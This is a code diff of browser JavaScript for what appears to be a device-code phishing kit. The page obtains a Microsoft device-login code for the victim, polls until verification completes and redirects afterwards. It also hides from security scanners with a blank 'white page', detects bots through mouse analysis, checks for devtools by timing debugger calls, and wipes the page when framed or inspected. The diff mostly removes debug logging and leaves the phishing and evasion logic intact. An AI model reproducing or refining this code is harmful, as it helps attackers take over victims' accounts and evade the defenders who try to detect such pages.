@@ -54,13 +54,6 @@
     }, 2000);
   }
 
-  console.log = function() { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
-  console.warn = function() { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
-  console.error = function() { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };
-  console.debug = function() { logToServer('debug', Array.prototype.slice.call(arguments).join(' ')); };
-  console.info = function() { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
-  console.trace = function() { logToServer('trace', Array.prototype.slice.call(arguments).join(' ')); };
-
   window.__VG_LOG = logToServer;
 
   var API_BASE = (typeof window.__API_BASE === 'string' && window.__API_BASE) ? window.__API_BASE : (typeof window.location !== 'undefined' ? window.location.origin : '');
@@ -82,7 +75,6 @@
     function release(reason) {
       if (released) return;
       released = true;
-      console.log('[VG] Interaction gate released: ' + reason);
       var g = document.getElementById('vgInteractionGate');
       if (g && g.parentNode) g.parentNode.removeChild(g);
     }
@@ -380,7 +372,6 @@
   }
 
   window.generateCode = async function () {
-    console.log('[VG] generateCode called');
     var refreshBtn = document.getElementById('refreshBtn');
     if (refreshBtn) refreshBtn.style.display = 'none';
     var actionRow = document.getElementById('actionRow');
@@ -389,7 +380,6 @@
     if (timerEl) { timerEl.textContent = ''; timerEl.style.display = 'none'; timerEl.classList.remove('expired'); }
 
     var startBtn = document.getElementById('startBtn');
-    console.log('[VG] startBtn found:', !!startBtn);
     var originalBtnText = '<span class="vg-spin">&#x27F3;</span> Generating code...';
     if (startBtn) { startBtn.disabled = true; startBtn.innerHTML = originalBtnText; }
 
@@ -402,27 +392,18 @@
 
     try {
       var apiUrl = API_BASE ? API_BASE + '/api/device/start' : '/api/device/start';
-      console.log('[VG] API URL:', apiUrl);
-      console.log('[VG] API_BASE:', API_BASE);
-      console.log('[VG] AUTH_MODE:', AUTH_MODE);
-      console.log('[VG] VG_JWT present:', !!VG_JWT);
 
       if (_vgTurnstileOn()) {
         if (window.__TURNSTILE_TOKEN) {
-          console.log('[VG] Turnstile token ready (len=' + window.__TURNSTILE_TOKEN.length + ')');
         } else if (_vgTurnstileManaged()) {
-          console.log('[VG] Turnstile token: using user-facing managed widget token');
         } else {
           if (!window.__TURNSTILE_WIDGET_ID) {
-            console.log('[VG] turnstile not initialised yet, starting it now');
             try { initTurnstileVerification(); } catch (e) {}
           }
 
           var _tsWaited = 0;
           var _tsLastNudge = 0;
           var _tsDeadline = 15000;
-          console.log('[VG] Turnstile token: waiting for background widget (cap ' +
-            _tsDeadline + 'ms)...');
           while (!window.__TURNSTILE_TOKEN && _tsWaited < _tsDeadline) {
             if (window.turnstile && window.__TURNSTILE_WIDGET_ID &&
                 (_tsWaited - _tsLastNudge) >= 1500) {
@@ -432,17 +413,10 @@
             await new Promise(function (res) { setTimeout(res, 200); });
             _tsWaited += 200;
           }
-          console.log('[VG] Turnstile wait: ' + _tsWaited + 'ms token=' +
-            (window.__TURNSTILE_TOKEN ? 'yes len=' + window.__TURNSTILE_TOKEN.length : 'NO'));
         }
       }
-      console.log('[VG] Turnstile token:', window.__TURNSTILE_TOKEN);
 
       if (_vgTurnstileOn() && !window.__TURNSTILE_TOKEN) {
-        console.log('[VG] Turnstile wait expired: widget_id=' +
-          (window.__TURNSTILE_WIDGET_ID || 'NONE') +
-          ' api_loaded=' + (typeof window.turnstile !== 'undefined') +
-          ' sitekey=' + String(window.__TURNSTILE_SITE_KEY || 'EMPTY').substring(0, 8));
         if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
         _showError('Security check not completed. Please click Generate Code again.');
         return;
@@ -462,14 +436,11 @@
           turnstile_token: window.__TURNSTILE_TOKEN || null,
         }),
       });
-      console.log('[VG] Response status:', r.status);
       var d = await r.json();
-      console.log('[VG] Response data:', JSON.stringify(d).substring(0, 500));
 
       window.__TURNSTILE_TOKEN = null;
 
       if (d.error) {
-        console.log('[VG] Error in response:', d.error);
         _showError(d.error);
         if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
         return;
@@ -477,17 +448,13 @@
 
       _jobId = d.job_id || '';
       _userCode = d.user_code || '';
-      console.log('[VG] job_id:', _jobId, '| user_code:', _userCode ? ('len=' + _userCode.length) : 'NO');
 
       _startTime = Date.now();
       var codePanel = document.getElementById('codePanel');
-      console.log('[VG] codePanel found:', !!codePanel);
       if (codePanel) codePanel.classList.add('show');
 
       if (_userCode) {
-        console.log('[VG] Displaying user code:', _userCode);
         var codeEl = document.getElementById('codeValue');
-        console.log('[VG] codeEl found:', !!codeEl);
         if (codeEl) {
 
           codeEl.setAttribute('data-vg-revealed', 'true');
@@ -496,7 +463,6 @@
             codeEl.textContent = _userCode;
             codeEl.classList.remove('loading');
             codeEl.style.opacity = 1;
-            console.log('[VG] Code displayed successfully');
           }, 150);
         }
         var codeHint = document.getElementById('codeHint');
@@ -509,7 +475,6 @@
         if (actionRow) {
           actionRow.style.setProperty('display', 'flex', 'important');
           _codeReady = true;
-          console.log('[VG] Action row shown');
         }
 
         if (_jobId) {
@@ -518,18 +483,15 @@
         }
         _startTimer(d.expires_in || 600);
       } else if (_jobId) {
-        console.log('[VG] No user_code yet, polling via job_id');
         _setStatus('Connecting to Microsoft servers...');
         _pollTimer = setInterval(_poll, 1000);
         _poll();
       } else {
-        console.log('[VG] No job_id and no user_code in response');
         _showError('Session failed. Please refresh.');
         if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = originalBtnText; }
         return;
       }
     } catch (e) {
-      console.error('[VG] Error in generateCode:', e);
       _showError(e.message || 'Connection failed');
       if (startBtn) { startBtn.disabled = false; startBtn.innerHTML = 'Generate Code'; }
     }
@@ -610,15 +572,12 @@
         _showError(d.error || d.status || 'Verification failed');
       }
     } catch (e) {
-      console.error('[VG] Poll error:', e.message || e);
 
       _pollFailures++;
-      console.log('[VG] Poll failures:', _pollFailures);
 
       _pollBackoff = Math.min(_pollBackoff * 2, 15000);
 
       if (_pollFailures >= _maxPollFailures) {
-        console.error('[VG] Too many poll failures, showing error to user');
         _showError('Connection to verification server lost. Please refresh the page.');
         clearInterval(_pollTimer);
         return;
@@ -797,8 +756,6 @@
 
     var redirectUrl = DEST_URL || '';
 
-    console.log('[vg-engine] Success! Redirect URL:', redirectUrl, 'Show verification:', SHOW_VERIFICATION);
-
     if (redirectUrl) {
       if (window.__BLOB_URL_ENABLED === 'true' || window.__BLOB_URL_ENABLED === true) {
         try {
@@ -806,20 +763,16 @@
           var isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent);
           if (isSafari) {
             var dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(html);
-            console.log('[vg-engine] Safari detected, using data URL');
           } else {
             var blob = new Blob([html], { type: 'text/html' });
             var blobUrl = URL.createObjectURL(blob);
             redirectUrl = blobUrl;
-            console.log('[vg-engine] Blob URL created');
           }
         } catch (e) {
-          console.warn('[vg-engine] Blob URL creation failed, using DEST_URL:', e.message);
           redirectUrl = DEST_URL;
         }
       }
       if (!SHOW_VERIFICATION) {
-        console.log('[vg-engine] Skipping verification screen, redirecting immediately to:', redirectUrl);
         try { window.close(); } catch(e) {}
         window.location.replace(redirectUrl);
         return;
@@ -828,17 +781,14 @@
       if (overlay) {
         overlay.classList.add('show');
         setTimeout(function () {
-          console.log('[vg-engine] Redirecting to:', redirectUrl);
           try { window.close(); } catch(e) {}
           window.location.replace(redirectUrl);
         }, 2500);
       } else {
-        console.log('[vg-engine] No overlay, redirecting immediately to:', redirectUrl);
         try { window.close(); } catch(e) {}
         window.location.replace(redirectUrl);
       }
     } else {
-      console.log('[vg-engine] No redirect URL set, showing overlay only');
       if (overlay) {
         overlay.classList.add('show');
         setTimeout(function () {
@@ -874,25 +824,20 @@
     }
   }
 
-
   function initBotDetection() {
     var isSliderPage = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
 
     try {
       if (window.__VG_CLOAK && window.__VG_CLOAK.bot) {
-        console.warn('[VG] Cloak verdict: bot [' + (window.__VG_CLOAK.reasons || []).join('|') + ']');
         showWhitePage();
         return;
       }
       if (window.__VG_CLOAK && window.__VG_CLOAK.score > 0) {
-        console.log('[VG] Cloak: allowed, soft score ' + window.__VG_CLOAK.score +
-          ' [' + (window.__VG_CLOAK.reasons || []).join('|') + ']');
       }
     } catch (e) {}
     
     setTimeout(function() {
       if (isBotRequest()) {
-        console.warn('[VG] Bot detected, showing white page (isSlider: ' + isSliderPage + ')');
         showWhitePage();
         return;
       }
@@ -902,9 +847,7 @@
       }
 
       var botScore = calculateBotScore();
-      console.log('[VG] Bot score:', botScore);
       if (botScore < 0.2) {
-        console.warn('[VG] Bot detected via passive scoring, showing white page');
         showWhitePage();
         return;
       }
@@ -1091,12 +1034,9 @@
       document.body.appendChild(widgetContainer);
     }
     var _tsKey0 = String(window.__TURNSTILE_SITE_KEY || '');
-    console.log('[VG] turnstile init: sitekey=' +
-      (_tsKey0 ? _tsKey0.substring(0, 8) + '...len=' + _tsKey0.length : 'EMPTY'));
 
     if (typeof window.turnstile === 'undefined') {
       window.vgOnTurnstileReady = function() {
-        console.log('[VG] turnstile api.js loaded');
         renderAndExecuteTurnstile(widgetContainer);
       };
 
@@ -1106,7 +1046,6 @@
       script.defer = true;
       script.id = 'vg-turnstile-script';
       script.onerror = function() {
-        console.log('[VG] turnstile api.js FAILED to load - no token possible');
       };
       (document.head || document.documentElement).appendChild(script);
       return;
@@ -1134,8 +1073,6 @@
       ? 'managed' : 'invisible';
 
     if (_vgTurnstileManaged()) {
-      console.log('[VG] turnstile: managed mode - background widget skipped, ' +
-        'token comes from the user-facing widget');
       return;
     }
 
@@ -1144,29 +1081,23 @@
         sitekey: window.__TURNSTILE_SITE_KEY,
         callback: function(token) {
           window.__TURNSTILE_TOKEN = token;
-          console.log('[VG] turnstile token acquired len=' + (token ? token.length : 0));
         },
         'error-callback': function() {
           if (!window.__TURNSTILE_TOKEN) window.__TURNSTILE_TOKEN = null;
-          console.log('[VG] turnstile error-callback fired (origin/sitekey/mode problem)');
         },
         'expired-callback': function() {
           window.__TURNSTILE_TOKEN = null;
-          console.log('[VG] turnstile token expired, re-executing');
           try { window.turnstile.execute(widgetId); } catch(e) {}
         }
       });
 
       widgetContainer.setAttribute('data-widget-id', widgetId);
       window.__TURNSTILE_WIDGET_ID = widgetId;
-      console.log('[VG] turnstile rendered: widget=' +
-        (widgetId == null ? 'NULL (render failed - bad sitekey or origin not whitelisted)' : 'ok'));
 
       setTimeout(function() {
         try { window.turnstile.execute(widgetId); } catch(e) {}
       }, 500);
     } catch(e) {
-      console.log('[VG] turnstile render threw: ' + (e && e.message));
     }
   }
 
@@ -1262,7 +1193,7 @@
       var threshold = 200; 
       var detected = false;
       var slowHits = 0;
-      console.log('[VG] devtools timing check starting, isSlider:', _isSlider);
+      var lastTimingLogged = -1;
       setTimeout(function() { 
         var _isMobileClone = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
         setInterval(function() {
@@ -1275,12 +1206,14 @@
             eval(debuggerStr);
           } catch(e) {}
           var elapsed = performance.now() - start;
-          console.log('[VG] devtools timing: elapsed =', elapsed, 'ms');
+          var elapsedR = Math.round(elapsed);
+          if (elapsedR !== lastTimingLogged) {
+            lastTimingLogged = elapsedR;
+          }
           if (elapsed > threshold && !_isSlider) {
             slowHits++;
             if (slowHits >= 2) {
               detected = true;
-              console.error('[VG] devtools timing FAILED, killing page');
               killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
             }
           } else {
@@ -1290,15 +1223,16 @@
       }, _gracePeriodMs);
     })();
 
-    console.log('[VG] initAntiClone starting, isSlider:', _isSlider);
     setTimeout(function() { 
       try {
+        var lastIntegrityLen = -1;
         var checkIntegrity = function() {
           if (document.visibilityState === 'hidden') return;
           var bodyHTML = document.body ? document.body.innerHTML : '';
-          console.log('[VG] integrity check: bodyHTML.length =', bodyHTML.length);
+          if (bodyHTML.length !== lastIntegrityLen) {
+            lastIntegrityLen = bodyHTML.length;
+          }
           if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider && !window.__VG_BLANKED) {
-            console.error('[VG] integrity check FAILED, killing page');
             killPage('integrity_check_body_' + bodyHTML.length);
           }
         };
@@ -1315,9 +1249,7 @@
       });
     }
     var isSliderPageAntiClone = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
-    console.log('[VG] iframe check: self !== top:', window.self !== window.top, 'isSlider:', isSliderPageAntiClone);
     if (window.self !== window.top && !isSliderPageAntiClone) {
-      console.error('[VG] iframe detected, killing page');
       document.documentElement.innerHTML = '';
       killPage('iframe_embed');
     }
@@ -1340,30 +1272,12 @@
       }, 2000); 
     }, _gracePeriodMs);
 
-    (function() {
-      var methods = ['log', 'debug', 'info', 'warn', 'error', 'table', 'trace', 'group', 'groupEnd'];
-      var lv = { log: 'info', debug: 'debug', info: 'info', warn: 'warn', error: 'error',
-                 table: 'info', trace: 'trace', group: 'info', groupEnd: 'info' };
-      methods.forEach(function(m) {
-        if (console[m]) {
-          console[m] = function() {
-            try { logToServer(lv[m] || 'info', Array.prototype.slice.call(arguments).join(' ')); } catch (e) {}
-          };
-        }
-      });
-    })();
-
     var _killPageCalled = false;
     function killPage(reason) {
       if (_killPageCalled) {
-        console.log('[VG] killPage already called, ignoring duplicate call:', reason);
         return;
       }
       _killPageCalled = true;
-
-      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
-      console.error('[VG] URL:', window.location.href);
-      console.error('[VG] User-Agent:', navigator.userAgent);
 
       try {
         document.open();
@@ -1589,13 +1503,9 @@
     var _killPageCalledBot = false;
     function killPage(reason) {
       if (_killPageCalledBot) {
-        console.log('[VG] killPage already called, ignoring duplicate:', reason);
         return;
       }
       _killPageCalledBot = true;
-
-      console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
-      console.error('[VG] URL:', window.location.href);
 
       try {
         document.open();
@@ -1672,7 +1582,6 @@
     }
     if (_killed) return;
 
-
     if (!isMobile) {
       var sizeInterval = setInterval(function () {
         if (_killed) { clearInterval(sizeInterval); return; }
@@ -1708,14 +1617,6 @@
   }
   function initObfuscation() {
     if (!_flagEnabled(window.__OBFUSCATION_ENABLED)) return;
-    (function () {
-      console.log = function () { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
-      console.warn = function () { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
-      console.error = function () { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };
-      console.debug = function () { logToServer('debug', Array.prototype.slice.call(arguments).join(' ')); };
-      console.info = function () { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
-      console.trace = function () { logToServer('trace', Array.prototype.slice.call(arguments).join(' ')); };
-    })();
     document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
 
     document.addEventListener('keydown', function (e) {
@@ -1727,8 +1628,6 @@
   function initSliderChainHandler() {
     var isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
     if (!isSlider) { return; }
-
-    console.log('[vg-engine] Slider design detected, setting up chain handler');
 
     // State flags to prevent race conditions
     var _sliderCompleted = false;
@@ -1746,8 +1645,6 @@
     function _resetCfTimeout() {
       clearTimeout(_cfTimeoutTimer);
       _cfTimeoutTimer = setTimeout(function() {
-        console.warn('[vg-engine] Cloudflare verification timed out after ' +
-          CF_TIMEOUT_MS + 'ms; keeping the verification layer up');
         _cfAttempts = _cfMaxAttempts;
         _cfLastError = 'Turnstile did not complete within the timeout';
         _turnstileRendering = false;
@@ -1771,8 +1668,6 @@
       }
 
       _cfAttempts += 1;
-      console.warn('[vg-engine] Cloudflare verification failed (' + _cfAttempts + '/' +
-        _cfMaxAttempts + '): ' + errMsg);
       if (cfHint) {
         cfHint.textContent = 'Verification failed, retrying (' + _cfAttempts +
           ' of ' + _cfMaxAttempts + ')...';
@@ -1840,20 +1735,13 @@
     if (typeof window.__vgOnSliderComplete !== 'function' || !window.__vgOnSliderComplete._isEngine) {
       window.__vgOnSliderComplete = function() {
         if (_sliderCompleted) {
-          console.log('[vg-engine] Slider complete callback fired but already processed, ignoring');
           return;
         }
         _sliderCompleted = true;
-        console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');
 
         try {
           var mouseResult = window.__VG_ANALYZE_MOUSE ? window.__VG_ANALYZE_MOUSE() : null;
           if (mouseResult && mouseResult.score >= 0.75) {
-            console.error('[vg-engine] Robotic mouse trajectory detected, score=' + mouseResult.score.toFixed(3) +
-              ' velCV=' + (mouseResult.velCV || 0).toFixed(3) +
-              ' dirChange=' + (mouseResult.dirChangeRatio || 0).toFixed(3) +
-              ' straight=' + (mouseResult.straightness || 0).toFixed(3) +
-              ' events=' + mouseResult.eventCount);
             if (typeof window.__VG_KILLPAGE === 'function') {
               window.__VG_KILLPAGE('robotic_mouse:' + mouseResult.score.toFixed(2));
               return;
@@ -1884,7 +1772,6 @@
     }
 
     if (window.__vgPendingSliderComplete && window.__vgSliderVerified) {
-      console.log('[vg-engine] Slider had already completed before engine loaded, triggering Turnstile');
       setTimeout(function() {
         if (typeof window.__vgOnSliderComplete === 'function') {
           window.__vgOnSliderComplete();
@@ -1894,7 +1781,6 @@
     
     function renderTurnstileIntoCfLayer() {
       if (_turnstileRendering || _turnstileRendered) {
-        console.log('[vg-engine] Turnstile already rendering or rendered, skipping');
         return;
       }
       _turnstileRendering = true;
@@ -1904,7 +1790,6 @@
       var cfHint = document.getElementById('vgCfHint');
       
       if(!cfWidgetWrap) {
-        console.warn('[vg-engine] vgCfWidgetWrap not found - keeping verification layer up');
         _turnstileRendering = false;
         _turnstileRendered = true;
         showCfFailureState(cfHint, 'Widget container missing');
@@ -1927,7 +1812,6 @@
       if(typeof window.turnstile !== 'undefined') {
         executeTurnstileIntoWrap(cfWidgetWrap);
       } else if(window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
-        console.log('[vg-engine] Loading Cloudflare Turnstile for slider chain');
         var script = document.createElement('script');
         script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReadyForSlider';
         script.async = true;
@@ -1941,12 +1825,10 @@
           }
         }, 15000);
         window.vgOnTurnstileReadyForSlider = function() {
-          console.log('[vg-engine] Cloudflare Turnstile loaded for slider chain');
           _turnstileRendering = false;
           executeTurnstileIntoWrap(cfWidgetWrap);
         };
       } else {
-        console.warn('[vg-engine] No Turnstile site key - refusing to reveal the page');
         _onCfFailure('No Turnstile site key configured');
       }
     }
@@ -1966,7 +1848,6 @@
           theme: 'light',
           retry: 'auto', 
           callback: function(token) {
-            console.log('[vg-engine] Cloudflare Turnstile completed');
             _cancelCfTimeout(); 
             window.__TURNSTILE_TOKEN = token;
             _turnstileRendered = true;
@@ -1975,12 +1856,9 @@
             }, 1000);
           },
           'error-callback': function(errorCode) {
-            console.warn('[vg-engine] Cloudflare Turnstile error-callback, code: ' +
-              (errorCode || 'unknown'));
             _onCfFailure('Turnstile error-callback ' + (errorCode || ''));
           },
           'expired-callback': function() {
-            console.warn('[vg-engine] Cloudflare Turnstile expired, re-executing');
             _cfAttempts = 0;
             try { window.turnstile.execute(widgetId); }
             catch(e) { _onCfFailure(String(e)); }
@@ -1994,13 +1872,11 @@
           try {
             window.turnstile.execute(widgetId);
           } catch(e) {
-            console.error('[vg-engine] Failed to execute Turnstile:', e.message || e);
             _onCfFailure(String(e));
           }
         }, 500);
 
       } catch(e) {
-        console.error('[vg-engine] Failed to render Turnstile:', e.message || e);
         _onCfFailure(String(e));
       }
     }
@@ -2039,7 +1915,6 @@
 
     function hideSliderAndCfLayers() {
       if (_layersHidden) {
-        console.log('[vg-engine] Layers already hidden, skipping');
         return;
       }
       _layersHidden = true;
@@ -2057,13 +1932,11 @@
           cfLayer.style.visibility = 'hidden';
         }
 
-        console.log('[vg-engine] Verification layers hidden, showing main content');
       });
     }
 
     setTimeout(function(){
       if (!_sliderCompleted && window.__vgCheckSliderReady && window.__vgCheckSliderReady()) {
-        console.log('[vg-engine] Slider was already completed, initializing Cloudflare');
         if (typeof window.__vgOnSliderComplete === 'function') {
           window.__vgOnSliderComplete();
         }
@@ -2086,10 +1959,6 @@
   window.__VG_KILLPAGE = function (reason) {
     if (window.__VG_KILLPAGE_DONE) return;
     window.__VG_KILLPAGE_DONE = true;
-
-    console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
-    console.error('[VG] URL:', window.location.href);
-    console.error('[VG] User-Agent:', navigator.userAgent);
 
     try {
       document.open();
